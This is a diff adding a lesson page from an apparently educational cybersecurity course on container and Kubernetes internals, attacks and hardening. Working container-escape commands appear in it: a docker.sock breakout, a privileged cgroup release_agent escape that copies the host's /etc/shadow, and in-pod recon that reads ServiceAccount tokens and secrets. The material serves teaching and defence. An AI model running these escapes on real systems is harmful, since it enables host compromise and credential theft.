@@ -1,0 +1,560 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Containers and Kubernetes — Cybersec Zero to Hero</title>
+<link rel="stylesheet" href="../../styles.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-mark">&gt;_</div>
+      <div>
+        <div class="brand-title">CYBERSEC</div>
+        <div class="brand-subtitle">zero · to · hero</div>
+      </div>
+    </div>
+    <div class="lang-switch"><a href="../../pages/19-container-kubernetes.html" class="lang-link" title="Passa all'italiano"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="10" height="20" fill="#009246"/><rect x="10" width="10" height="20" fill="#fff"/><rect x="20" width="10" height="20" fill="#ce2b37"/></svg> IT</a><span class="lang-active" title="English"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="30" height="20" fill="#012169"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#fff" stroke-width="3"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#c8102e" stroke-width="1.5"/><path d="M15,0 v20 M0,10 h30" stroke="#fff" stroke-width="5"/><path d="M15,0 v20 M0,10 h30" stroke="#c8102e" stroke-width="3"/></svg> EN</span></div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-row">
+      <div class="search-inputwrap">
+        <span class="search-icon" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="20" y1="20" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input class="search-input" id="search-input" type="text" placeholder="search... (press /)" autocomplete="off" aria-label="Search">
+        <button class="search-clear" id="search-clear" type="button" aria-label="Clear" title="Clear">&times;</button>
+      </div>
+      <button class="search-btn" id="search-btn" type="button" aria-label="SEARCH" title="SEARCH">SEARCH</button>
+    </div>
+    <div class="search-hits" id="search-hits" role="listbox"></div>
+  </div>
+  <div class="sidebar-nav">
+    <nav class="nav-section">
+      <div class="nav-section-title">Path</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="../index.html"><span class="num">00</span>Home</a></li>
+        <li class="nav-item"><a href="../pages/00-path-and-mindset.html" class=""><span class="num">00</span>Path, mindset, ethics and law</a></li><li class="nav-item"><a href="../pages/00b-math-and-cs.html" class=""><span class="num">00b</span>Math and computation theory (the bare minimum, integrated)</a></li><li class="nav-item"><a href="../pages/01-cs-fundamentals.html" class=""><span class="num">01</span>Computer science fundamentals for security</a></li><li class="nav-item"><a href="../pages/01b-assembly-from-zero.html" class=""><span class="num">01b</span>x86-64 and ARM64 Assembly from zero</a></li><li class="nav-item"><a href="../pages/02-essential-linux.html" class=""><span class="num">02</span>Essential Linux for security</a></li><li class="nav-item"><a href="../pages/02b-regex-automata.html" class=""><span class="num">02b</span>Regex, automata, and parsers for security</a></li><li class="nav-item"><a href="../pages/03-networking-tcp-ip.html" class=""><span class="num">03</span>Networking: from cables to TCP/IP</a></li><li class="nav-item"><a href="../pages/04-http-tls.html" class=""><span class="num">04</span>HTTP, HTTPS and TLS in depth</a></li><li class="nav-item"><a href="../pages/05-cryptography.html" class=""><span class="num">05</span>Cryptography: theory and practice</a></li><li class="nav-item"><a href="../pages/05b-crypto-worked-examples.html" class=""><span class="num">05b</span>Cryptography — step-by-step worked examples</a></li><li class="nav-item"><a href="../pages/06-os-internals.html" class=""><span class="num">06</span>OS internals: Linux and Windows in depth</a></li><li class="nav-item"><a href="../pages/07-programming-for-security.html" class=""><span class="num">07</span>Programming for security: Python, C, Go</a></li><li class="nav-item"><a href="../pages/08-osint-recon.html" class=""><span class="num">08</span>OSINT and reconnaissance</a></li><li class="nav-item"><a href="../pages/09-scanning-enumeration.html" class=""><span class="num">09</span>Scanning, enumeration and fingerprinting</a></li><li class="nav-item"><a href="../pages/10-owasp-top10.html" class=""><span class="num">10</span>OWASP Top 10 and beyond — basic web vulnerabilities</a></li><li class="nav-item"><a href="../pages/10b-walkthrough-byte-by-byte.html" class=""><span class="num">10b</span>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR</a></li><li class="nav-item"><a href="../pages/11-advanced-web.html" class=""><span class="num">11</span>Advanced web hacking</a></li><li class="nav-item"><a href="../pages/12-network-attacks.html" class=""><span class="num">12</span>Network attacks: MITM, spoofing, pivoting</a></li><li class="nav-item"><a href="../pages/13-active-directory.html" class=""><span class="num">13</span>Active Directory hacking</a></li><li class="nav-item"><a href="../pages/14-exploit-development.html" class=""><span class="num">14</span>Exploit development: from buffer overflow to ROP</a></li><li class="nav-item"><a href="../pages/14b-bof-to-shell-complete.html" class=""><span class="num">14b</span>BoF → shell: a complete exploit from zero</a></li><li class="nav-item"><a href="../pages/15-reverse-engineering.html" class=""><span class="num">15</span>Reverse engineering</a></li><li class="nav-item"><a href="../pages/16-malware-analysis.html" class=""><span class="num">16</span>Malware: taxonomy and analysis</a></li><li class="nav-item"><a href="../pages/17-mobile-security.html" class=""><span class="num">17</span>Mobile security: Android and iOS</a></li><li class="nav-item"><a href="../pages/18-cloud-security.html" class=""><span class="num">18</span>Cloud security: AWS, Azure, GCP</a></li><li class="nav-item"><a href="../pages/19-container-kubernetes.html" class="active"><span class="num">19</span>Containers and Kubernetes</a></li><li class="nav-item"><a href="../pages/20-wireless-radio.html" class=""><span class="num">20</span>Wireless and radio: WiFi, BT, SDR</a></li><li class="nav-item"><a href="../pages/21-hardware-firmware.html" class=""><span class="num">21</span>Hardware and firmware hacking</a></li><li class="nav-item"><a href="../pages/22-forensics-dfir.html" class=""><span class="num">22</span>Forensics and DFIR</a></li><li class="nav-item"><a href="../pages/23-blue-team-soc.html" class=""><span class="num">23</span>Blue team: SOC, SIEM, EDR, hunting</a></li><li class="nav-item"><a href="../pages/24-threat-intelligence.html" class=""><span class="num">24</span>Threat intelligence</a></li><li class="nav-item"><a href="../pages/25-grc-regulations.html" class=""><span class="num">25</span>GRC, regulations, and standards</a></li><li class="nav-item"><a href="../pages/26-red-team.html" class=""><span class="num">26</span>Red team and adversary emulation</a></li><li class="nav-item"><a href="../pages/27-ai-ml-security.html" class=""><span class="num">27</span>AI / ML security</a></li><li class="nav-item"><a href="../pages/28-capstone-roadmap.html" class=""><span class="num">28</span>Capstone: CTF roadmap, home lab, certifications</a></li><li class="nav-item"><a href="../pages/29-master-cheatsheet.html" class=""><span class="num">29</span>Master cheatsheet</a></li><li class="nav-item"><a href="../pages/30-extended-glossary.html" class=""><span class="num">30</span>Extended glossary (250+ terms)</a></li><li class="nav-item"><a href="../pages/31-it-eu-regulations.html" class=""><span class="num">31</span>IT/EU regulatory references in detail</a></li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+  <main class="main">
+    <div class="content">
+      <div class="page-meta">
+        <span class="pill">Cloud</span>
+        <span>Section 24 of 36</span>
+        <span class="level-tag level-adv">Level: advanced</span>
+      </div>
+      <h1>Containers and Kubernetes</h1>
+      <p class="summary">Docker internals (namespaces, cgroups, capabilities). Container escape, K8s architecture, RBAC, ServiceAccount tokens, network policy, admission control, supply chain (image signing). Kubernetes attack &amp; defense.</p>
+      <div class="info-card">
+  <div class="label">Area</div>
+  <div>Cloud</div>
+  <div class="label">Prerequisites</div>
+  <ul class="source-list"><li>Section 06 (OS internals), 18 (cloud)</li></ul>
+  <div class="label">Tools</div>
+  <ul class="source-list"><li>docker, ctr, podman</li><li>kubectl, kubeadm</li><li>kube-hunter, kubeaudit, kube-bench, kubescape</li><li>Trivy, Grype (image scanning)</li><li>Falco, Tetragon (runtime detection)</li><li>Cosign, Notation (signing)</li></ul>
+</div>
+      <blockquote>
+<p>Container ≠ VM. It's a Linux process with namespaces and cgroups. Grasping this is the difference between "looks secure" and "actually is".</p>
+</blockquote>
+<h2 id="docker-and-container-internals">Docker and container internals</h2>
+<blockquote>
+<p>Thinking of a container as a "lightweight VM" is wrong. It's <strong>a regular Linux process</strong> with some "masking" applied. Let me prove it.</p>
+</blockquote>
+<h3 id="1-namespaces-isolation-for-the-process">1. Namespaces — isolation for the process</h3>
+<p>A namespace tells the kernel "this process sees only this subset of global resources". 8 types:</p>
+<table>
+<thead>
+<tr>
+<th>Namespace</th>
+<th>What it hides</th>
+<th>How to try it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>mnt</strong></td>
+<td>private mount table</td>
+<td><code>unshare -m bash</code> → mount, you only see your own</td>
+</tr>
+<tr>
+<td><strong>pid</strong></td>
+<td>own PID space (PID 1 = the container init)</td>
+<td><code>unshare --fork --pid --mount-proc bash; ps</code></td>
+</tr>
+<tr>
+<td><strong>net</strong></td>
+<td>interfaces, routing, iptables, /proc/net</td>
+<td><code>ip netns add foo; ip netns exec foo ip a</code> (lo only)</td>
+</tr>
+<tr>
+<td><strong>ipc</strong></td>
+<td>IPC, semaphores, message queues, shared memory</td>
+<td><code>ipcs</code> only shows its own</td>
+</tr>
+<tr>
+<td><strong>uts</strong></td>
+<td>hostname and domainname</td>
+<td><code>unshare -u bash; hostname pippo</code> doesn't change host</td>
+</tr>
+<tr>
+<td><strong>user</strong></td>
+<td>UID/GID mapping (root in container ≠ root host)</td>
+<td><code>unshare -U bash; id</code> → nobody</td>
+</tr>
+<tr>
+<td><strong>cgroup</strong></td>
+<td>cgroup root view</td>
+<td><code>cat /proc/self/cgroup</code> shows a "fake" path</td>
+</tr>
+<tr>
+<td><strong>time</strong></td>
+<td>clock offset</td>
+<td>recent (5.6+)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Concrete experiment</strong> (on Linux):</p>
+<pre><code class="language-bash"># In a Docker container:
+docker run --rm -it alpine sh
+# Inside:
+ps aux           # you only see the container's processes
+ls /proc         # PIDs are remapped by the pid namespace
+mount            # own mount table
+ip a             # private interfaces
+echo $$          # PID 1 (PID 1 INSIDE the container)
+
+# From outside (host):
+ps aux | grep &lt;container command&gt;
+# You see the SAME process with a different host PID (e.g. 24531)
+</code></pre>
+<p>The same process has <strong>two PIDs</strong>: one in the namespace (PID 1) and one in the host namespace (24531). It's the <strong>same kernel entity</strong> seen through two different "lenses".</p>
+<p><strong>Security:</strong> a container with <strong><code>--pid host</code></strong> shares the host's PID namespace → sees all host processes → can <code>kill</code> anywhere. The same applies to <code>--net host</code> (sniffer on host network), <code>--ipc host</code>, etc. <strong>All these flags open up escapes.</strong></p>
+<h3 id="2-cgroups-the-resource-limits">2. cgroups — the resource limits</h3>
+<p>Cgroup v2 (kernel 4.5+, unified) is a tree under <code>/sys/fs/cgroup/</code>:</p>
+<pre><code>/sys/fs/cgroup/
+├── memory.max              ← RAM limit
+├── cpu.max                 ← CPU limit (quota/period)
+├── io.max                  ← I/O bandwidth
+├── pids.max                ← max processes
+└── system.slice/
+    └── docker-abc.scope/
+        ├── memory.max  =  536870912    ← 512 MB
+        ├── memory.current = 102400000
+        └── cgroup.procs    ← list of PIDs in the cgroup
+</code></pre>
+<p>Add a process to the cgroup → the kernel enforces the limits. If it exceeds them, it gets <strong>SIGKILL</strong> (<code>memory.oom.kill</code>) or gets <strong>throttled</strong> (CPU).</p>
+<p><strong>Security:</strong> without cgroups, a container can run a <code>fork bomb</code> or <code>dd if=/dev/zero of=/tmp/big bs=1G count=100</code> and starve the host. Docker sets conservative defaults; but <code>--memory unlimited</code> becomes a problem again.</p>
+<h3 id="3-capabilities-fractions-of-root">3. Capabilities — fractions of "root"</h3>
+<p>Historically "root" = omnipotence. Linux 2.2+ has 41 discrete <strong>capabilities</strong>. Examples:</p>
+<table>
+<thead>
+<tr>
+<th>Cap</th>
+<th>Allows</th>
+<th>Container default?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>CAP_NET_ADMIN</code></td>
+<td>configure network, iptables, raw sockets</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_ADMIN</code></td>
+<td>almost everything (mount, namespace, ...)</td>
+<td>❌ — dangerous</td>
+</tr>
+<tr>
+<td><code>CAP_SYS_PTRACE</code></td>
+<td>ptrace on other processes</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>CAP_NET_BIND_SERVICE</code></td>
+<td>bind ports &lt; 1024</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>CAP_CHOWN</code></td>
+<td>chown without being owner</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>CAP_DAC_OVERRIDE</code></td>
+<td>bypass DAC permissions</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<p>Docker gives 14 caps by default, drops 27. <strong><code>--privileged</code> = all 41 → real root on host = trivial escape.</strong></p>
+<p>See the current process's caps:</p>
+<pre><code class="language-bash">grep Cap /proc/self/status
+capsh --print
+getpcaps $$
+</code></pre>
+<h3 id="4-seccomp-the-syscall-filter">4. Seccomp — the syscall filter</h3>
+<p>Docker loads a default <strong>seccomp profile</strong> (<code>default.json</code>) that blocks ~50 dangerous syscalls (e.g. <code>mount</code>, <code>umount</code>, <code>pivot_root</code>, <code>kexec_load</code>, <code>keyctl</code>, ...).</p>
+<p>Modes:
+- <code>SECCOMP_MODE_STRICT</code>: only <code>read</code>, <code>write</code>, <code>exit</code>, <code>sigreturn</code> (extreme sandbox).
+- <code>SECCOMP_MODE_FILTER</code>: a BPF program decides for each syscall (allow / deny / errno / trap).</p>
+<p><strong><code>--security-opt seccomp=unconfined</code></strong> disables the filter → reopens all syscalls → prelude to escape.</p>
+<h3 id="5-lsm-apparmor-selinux-mac">5. LSM (AppArmor / SELinux) — MAC</h3>
+<p>An extra layer: AppArmor (Ubuntu/Debian) or SELinux (RHEL) enforces policies <strong>at the kernel level</strong> that not even container root can violate. Examples:
+- container cannot write to <code>/proc/*/attr/</code>.
+- container cannot <code>ptrace</code> certain pids.
+- container has SELinux labels that restrict access to files with different labels.</p>
+<p><strong><code>--security-opt apparmor=unconfined</code></strong> → no AppArmor → one less piece of wall.</p>
+<h3 id="6-layered-filesystem-overlay2">6. Layered filesystem (overlay2)</h3>
+<p>A Docker image is a <strong>chain of read-only layers</strong> (e.g. <code>ubuntu:22.04</code> has 3 base layers, each is a tar of a diff). When you launch a container, a <strong>writable layer</strong> is added on top via OverlayFS:</p>
+<pre><code>upperdir (rw, container)   ← every change ends up here
++---------------------------+
+| layer N (image RO)        |
+| layer N-1 (image RO)      |
+| ...                       |
+| layer 0 (base ubuntu)     |
++---------------------------+
+</code></pre>
+<p>See the overlay mount with <code>mount | grep overlay</code>. When the container is deleted → upperdir deleted → changes lost (unless you use a volume).</p>
+<h3 id="summary-what-makes-a-container-isolated">Summary: what makes a container "isolated"</h3>
+<div class="mermaid">
+flowchart TB
+    P[Container process] --> NS[Namespaces<br/>mnt · pid · net · ipc · uts · user · cgroup · time]
+    P --> CG[cgroups<br/>CPU/RAM/IO/pids limits]
+    P --> CAP[Capabilities<br/>subset of root]
+    P --> SEC[seccomp<br/>~50 syscalls blocked]
+    P --> LSM[LSM<br/>AppArmor / SELinux]
+    P --> FS[OverlayFS<br/>RO layers + RW upper]
+    NS --> K[Linux kernel<br/>shared with host!]
+    CG --> K
+    CAP --> K
+    SEC --> K
+    LSM --> K
+    FS --> K
+    style K fill:#3a0b0b,stroke:#ff4d4d
+
+</div>
+
+<p><strong>The kernel is shared.</strong> A kernel exploit (DirtyPipe, DirtyCow, OverlayFS race) executed from a container = host root. That's why <code>gVisor</code> (Google sandbox with a user-mode kernel) and <code>Kata Containers</code> (microVM per container) exist: they turn the container into a "lightweight VM" to avoid kernel sharing.</p>
+<h3 id="commands-youll-live-with">Commands you'll live with</h3>
+<pre><code class="language-bash">docker run --rm -it ubuntu:latest bash
+docker ps
+docker images
+docker exec -it &lt;id&gt; bash
+docker logs &lt;id&gt;
+docker inspect &lt;id&gt;          # tons of config
+docker network ls
+docker volume ls
+docker save img -o img.tar    # export image
+docker save img | tar -xv     # inspect layers
+</code></pre>
+<p>Manual inspection of an image:</p>
+<pre><code class="language-bash">docker save myimg | tar -x -C myimg-dir
+cd myimg-dir
+ls                            # manifest.json, layer.tar for each
+tar -tvf layer.tar | head     # contents of a layer
+</code></pre>
+<h2 id="common-vulnerabilities-in-containers">Common vulnerabilities in containers</h2>
+<h3 id="image-misconfig">Image misconfig</h3>
+<ul>
+<li><strong>Run as root</strong> (default). Add <code>USER 1000</code> non-root.</li>
+<li><strong>No verification</strong>: image pull without signing. <code>:latest</code> changes.</li>
+<li><strong>CVE in image</strong>: old image with unpatched base OS.</li>
+<li><strong>Secrets in env</strong> or in <code>Dockerfile</code> (<code>ENV API_KEY=...</code>).</li>
+<li><strong>Useless tools</strong>: shell + curl + wget make post-exploit easier. <strong>Distroless</strong> or <strong>scratch</strong> + static binary = minimal attack surface.</li>
+<li><strong>Missing <code>.dockerignore</code></strong> → secrets in the build context.</li>
+<li><strong>Cache poisoning</strong> in CI/CD.</li>
+</ul>
+<p>Scan: <strong>Trivy</strong>, <strong>Grype</strong>, <strong>Snyk Container</strong>, <strong>Docker Scout</strong>, <strong>Anchore</strong>.</p>
+<pre><code class="language-bash">trivy image alpine:3.18
+trivy image --severity HIGH,CRITICAL myimg:1.0
+trivy config Dockerfile
+</code></pre>
+<h3 id="runtime-misconfig">Runtime misconfig</h3>
+<ul>
+<li><code>--privileged</code> — the container is host-effective root.</li>
+<li><code>-v /:/host</code> — mount host root inside the container.</li>
+<li><code>--cap-add SYS_ADMIN</code> or <code>ALL</code> — full capability.</li>
+<li><code>--net host</code> — no network namespace.</li>
+<li><code>--pid host</code> — sees all host processes.</li>
+<li><code>--ipc host</code>.</li>
+<li><code>/var/run/docker.sock</code> mounted → attacker calls the docker daemon → creates a <code>--privileged</code> container → instant escape.</li>
+</ul>
+<pre><code class="language-bash">docker run -v /var/run/docker.sock:/var/run/docker.sock alpine
+apk add docker; docker run -v /:/host --privileged alpine chroot /host bash
+</code></pre>
+<h3 id="container-escape-typical-paths">Container escape — typical paths</h3>
+<ol>
+<li><strong>Privileged container</strong> + cgroup mount → <code>release_agent</code> trick (CVE-pre-2022).</li>
+<li><strong>CAP_SYS_ADMIN</strong> → mount, ptrace, abuse.</li>
+<li><strong>Docker socket exposed</strong>.</li>
+<li><strong>runc CVE-2019-5736</strong> — overwrite the runc binary from the container.</li>
+<li><strong>runc CVE-2024-21626</strong> ("Leaky Vessels") — fd leak allows escape via <code>WORKDIR</code>.</li>
+<li><strong>CRI-O / containerd</strong> historical CVEs.</li>
+<li><strong>Kernel exploit</strong> — kernel is shared with host; kernel LPE = host root.</li>
+<li><strong>Misuse of <code>/proc/self/exe</code></strong> abuse.</li>
+<li><strong>Full /proc</strong> mount (not the default masked <code>/proc</code>).</li>
+</ol>
+<p>Tools: <strong>CDK</strong> (Chinese container exploit kit), <strong>deepce</strong> (Container Enumeration), <strong>botb</strong>.</p>
+<h2 id="kubernetes-getting-to-the-point">Kubernetes — getting to the point</h2>
+<h3 id="architecture">Architecture</h3>
+<div class="mermaid">
+flowchart TB
+    subgraph CP [Control Plane]
+        API[kube-apiserver<br/>REST API · AuthN/Z · admission]
+        ETCD[(etcd<br/>key/value store)]
+        SCH[kube-scheduler]
+        CTRL[kube-controller-manager]
+        CCM[cloud-controller-manager]
+        API <--> ETCD
+        SCH --> API
+        CTRL --> API
+        CCM --> API
+    end
+    subgraph WN1 [Worker Node 1]
+        KL1[kubelet]
+        KP1[kube-proxy]
+        CR1[containerd / CRI-O]
+        P1[Pod A]
+        P2[Pod B]
+        KL1 --> CR1
+        CR1 --> P1
+        CR1 --> P2
+    end
+    subgraph WN2 [Worker Node 2]
+        KL2[kubelet]
+        KP2[kube-proxy]
+        CR2[containerd / CRI-O]
+        P3[Pod C]
+        KL2 --> CR2
+        CR2 --> P3
+    end
+    API <--> KL1
+    API <--> KL2
+    USER[user / CI] -->|kubectl apply| API
+
+</div>
+
+<h3 id="key-objects">Key objects</h3>
+<ul>
+<li><strong>Pod</strong>: 1+ co-located containers.</li>
+<li><strong>Deployment</strong>: manages pod replicas.</li>
+<li><strong>Service</strong>: network ABI (ClusterIP, NodePort, LoadBalancer).</li>
+<li><strong>Ingress</strong>: HTTP routing.</li>
+<li><strong>ConfigMap / Secret</strong>: config data / secrets (Secret is just base64, <strong>not encrypted</strong> by default! enable etcd encryption).</li>
+<li><strong>Namespace</strong>: logical separation.</li>
+<li><strong>ServiceAccount</strong>: identity for the pod → JWT token mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</li>
+<li><strong>Role / RoleBinding / ClusterRole / ClusterRoleBinding</strong>: RBAC.</li>
+<li><strong>NetworkPolicy</strong>: L3/L4 firewall per pod (requires a CNI that supports it — Calico, Cilium).</li>
+</ul>
+<h3 id="kubernetes-attack-surface">Kubernetes attack surface</h3>
+<ol>
+<li><strong>Exposed API server</strong> (NodePort, public LoadBalancer) without strong auth.</li>
+<li><strong>Dashboard without auth</strong> (historical, still found in the wild).</li>
+<li><strong>kubelet API</strong> (port 10250) exposed → <code>/exec</code> on arbitrary pods.</li>
+<li><strong>etcd</strong> exposed (port 2379) → all Secrets in cleartext (base64).</li>
+<li><strong>Over-privileged Service Account</strong> in a compromised pod → <code>kubectl ... -n kube-system</code> from inside.</li>
+<li><strong>Privileged pod</strong> → escape to the node.</li>
+<li><strong>Container image registry</strong> with weak auth.</li>
+<li><strong>Helm chart</strong> with default creds.</li>
+<li><strong>Workload identity</strong> → cloud IAM escalation (e.g. pod with access to Workload Identity in GKE = GCP role).</li>
+</ol>
+<h3 id="recon-inside-a-compromised-pod">Recon inside a compromised pod</h3>
+<pre><code class="language-bash">cat /var/run/secrets/kubernetes.io/serviceaccount/token
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -k -H &quot;Authorization: Bearer $TOKEN&quot; https://kubernetes.default/api/v1/namespaces
+kubectl auth can-i --list                       # if kubectl is around
+kubectl auth can-i create pods --all-namespaces
+
+# Look for &quot;interesting&quot; envs
+env | grep -iE &quot;key|secret|token|password&quot;
+# Mounts
+mount
+# Capabilities
+capsh --print
+# Privileged?
+ls /dev | head                                  # if you see sda1 -&gt; probably privileged
+</code></pre>
+<h3 id="offensive-k8s-tools">Offensive K8s tools</h3>
+<ul>
+<li><strong>kube-hunter</strong> (penetration tester).</li>
+<li><strong>botb</strong> (container) + <strong>CDK</strong>.</li>
+<li><strong>peirates</strong>.</li>
+<li><strong>DeepCE</strong>.</li>
+<li><strong>kdigger</strong> (comprehensive recon).</li>
+</ul>
+<h3 id="defensive-hardening-tools">Defensive / hardening tools</h3>
+<ul>
+<li><strong>kube-bench</strong> (CIS Benchmark check).</li>
+<li><strong>kubescape</strong> (config + RBAC + supply chain).</li>
+<li><strong>kubeaudit</strong> (security audit).</li>
+<li><strong>Polaris</strong>.</li>
+<li><strong>Falco</strong> (runtime detection).</li>
+<li><strong>Tetragon</strong> (eBPF based).</li>
+<li><strong>OPA Gatekeeper / Kyverno</strong> (admission control policy as code).</li>
+</ul>
+<h3 id="example-kyverno-policy">Example Kyverno policy</h3>
+<pre><code class="language-yaml">apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: disallow-privileged
+spec:
+  validationFailureAction: enforce
+  rules:
+    - name: privileged-not-allowed
+      match: { resources: { kinds: [Pod] } }
+      validate:
+        message: &quot;Privileged container not allowed&quot;
+        pattern:
+          spec:
+            containers:
+              - =(securityContext):
+                  =(privileged): &quot;false&quot;
+</code></pre>
+<h2 id="container-supply-chain">Container supply chain</h2>
+<h3 id="image-signing">Image signing</h3>
+<ul>
+<li><strong>Cosign</strong> (sigstore) — keyless signing with OIDC, Rekor transparency log.</li>
+<li><strong>Notation</strong> (Notary v2) — alternative.</li>
+</ul>
+<pre><code class="language-bash">cosign sign --key cosign.key myimg:1.0
+cosign verify --key cosign.pub myimg:1.0
+</code></pre>
+<p>In K8s: admission policy that blocks unsigned images.</p>
+<h3 id="sbom">SBOM</h3>
+<p>Software Bill of Materials for images: <strong>Syft</strong> generates SBOMs, <strong>Grype</strong> scans for CVEs.</p>
+<pre><code class="language-bash">syft myimg:1.0 -o spdx-json &gt; sbom.json
+grype sbom:sbom.json
+</code></pre>
+<h3 id="reproducible-builds-in-toto-attestation">Reproducible builds, in-toto attestation</h3>
+<p>Cosign supports attestations: "this image was built by that pipeline on that commit". Verify in admission.</p>
+<h2 id="short-kubernetes-hardening-checklist">Short Kubernetes hardening checklist</h2>
+<ul>
+<li>[ ] etcd encryption at-rest enabled.</li>
+<li>[ ] RBAC enabled (default), least-privilege policy.</li>
+<li>[ ] PodSecurityStandards (PSS) "restricted" on prod namespaces.</li>
+<li>[ ] NetworkPolicy default deny + explicit allow.</li>
+<li>[ ] Admission control with Kyverno/OPA.</li>
+<li>[ ] Image signing required.</li>
+<li>[ ] No privileged pods without documented exception.</li>
+<li>[ ] Least-privilege ServiceAccount, no token auto-mount unless needed.</li>
+<li>[ ] Runtime detection (Falco/Tetragon).</li>
+<li>[ ] Audit log on, exported to SIEM.</li>
+<li>[ ] Workload identity instead of static keys for cloud.</li>
+<li>[ ] Updates: kube-apiserver/controller/scheduler/kubelet patched.</li>
+</ul>
+<h2 id="exercises">Exercises</h2>
+<h3 id="exercise-191-easy-docker-escape">Exercise 19.1 — "Easy" Docker escape</h3>
+<p>In a VM, run:</p>
+<pre><code class="language-bash">docker run --rm -it --privileged ubuntu bash
+# inside
+mount -t cgroup -o rdma cgroup /mnt/cg
+echo '#!/bin/sh' &gt; /tmp/x
+echo 'cat /etc/shadow &gt; /tmp/host-shadow' &gt;&gt; /tmp/x
+chmod +x /tmp/x
+echo &quot;$(realpath /tmp/x)&quot; &gt; /mnt/cg/release_agent
+echo 1 &gt; /sys/fs/cgroup/notify_on_release
+echo a &gt; /mnt/cg/cgroup.procs   # trigger
+cat /tmp/host-shadow
+</code></pre>
+<p>Explain what it does. Which flag mitigates it (<code>--cap-drop ALL --security-opt no-new-privileges</code>)?</p>
+<h3 id="exercise-192-docker-socket-abuse">Exercise 19.2 — Docker socket abuse</h3>
+<p>Run a container mounting <code>/var/run/docker.sock</code>. Inside: <code>docker run -v /:/h --privileged alpine chroot /h sh</code>. Explain.</p>
+<h3 id="exercise-193-k8s-lab-setup">Exercise 19.3 — K8s lab setup</h3>
+<p><strong>kind</strong> (Kubernetes in Docker) or <strong>minikube</strong>. Create a local cluster. Launch a pod with a "loose" security context:</p>
+<pre><code class="language-yaml">securityContext:
+  privileged: true
+  capabilities: { add: [&quot;SYS_ADMIN&quot;] }
+</code></pre>
+<p>Inside the pod, try to escape to the host node.</p>
+<h3 id="exercise-194-kube-hunter">Exercise 19.4 — kube-hunter</h3>
+<pre><code class="language-bash">kube-hunter --remote 10.0.0.10
+kube-hunter --cidr 10.0.0.0/24 --active
+</code></pre>
+<p>What do you find?</p>
+<h3 id="exercise-195-rbac-privesc">Exercise 19.5 — RBAC privesc</h3>
+<p>Set up a ServiceAccount with <code>create</code> on <code>pods</code> but nothing else. From a pod with that SA, run a pod that mounts host <code>/</code> → escape. Mitigation: PodSecurityStandards.</p>
+<h3 id="exercise-196-image-scan">Exercise 19.6 — Image scan</h3>
+<p>Build an image based on <code>node:14</code> (old, vulnerable). Scan it:</p>
+<pre><code class="language-bash">trivy image myapp:1.0
+grype myapp:1.0
+</code></pre>
+<p>How many CVEs?</p>
+<h3 id="exercise-197-falco-runtime">Exercise 19.7 — Falco runtime</h3>
+<p>Install Falco in the cluster. In a pod, run: <code>apt update</code>. Falco should alert ("Package management process launched in a container"). Study the other default rules.</p>
+<h3 id="exercise-198-sigstore-cosign">Exercise 19.8 — Sigstore / Cosign</h3>
+<p>Generate a keypair:</p>
+<pre><code class="language-bash">cosign generate-key-pair
+cosign sign --key cosign.key registry/myimg:1.0
+cosign verify --key cosign.pub registry/myimg:1.0
+</code></pre>
+<p>Add a Kyverno policy that requires a signature → deploying an unsigned image is blocked.</p>
+<h3 id="exercise-199-ctf">Exercise 19.9 — CTF</h3>
+<ul>
+<li><strong>Kubernetes Goat</strong> (Madhu Akula): https://madhuakula.com/kubernetes-goat/ — guided vulnerable scenarios.</li>
+<li><strong>TryHackMe</strong>: "<strong>Cloud K8s</strong>" room.</li>
+<li><strong>WrongSecrets</strong> (multi-arch challenge): https://github.com/OWASP/wrongsecrets.</li>
+</ul>
+<h2 id="key-concepts">Key concepts</h2>
+<ol>
+<li><strong>Container ≠ VM</strong>: it's an isolated process. Escape is kernel exploit or config misuse.</li>
+<li><strong><code>--privileged</code> or docker.sock = easy escape</strong>.</li>
+<li><strong>K8s RBAC</strong> is the security plane, keep it minimal.</li>
+<li><strong>ServiceAccount token in a pod</strong> = keys to the kingdom if privileges are too broad.</li>
+<li><strong>Admission control + PSS + NetworkPolicy</strong> = baseline.</li>
+<li><strong>Supply chain (image signing, SBOM)</strong> isn't optional in 2026.</li>
+<li><strong>Runtime detection (Falco/Tetragon)</strong> works as EDR for K8s.</li>
+</ol>
+<p>Next: the wireless and radio world.</p>
+      <nav class="pager">
+<a href="18-cloud-security.html" class="prev"><span class="label">← Previous</span><span class="title">Cloud security: AWS, Azure, GCP</span></a>
+<a href="20-wireless-radio.html" class="next"><span class="label">Next →</span><span class="title">Wireless and radio: WiFi, BT, SDR</span></a>
+</nav>
+      <footer class="page-footer">
+        <p><strong>Cybersec Zero to Hero</strong> — built as a continuous path. Static build from Markdown.</p><p>Educational material. Everything you learn here is to be used only on systems you own, in labs, in authorized bug-bounty programs, or under signed pentest contracts. <strong>Don't break the law.</strong></p>
+      </footer>
+    </div>
+  </main>
+</div>
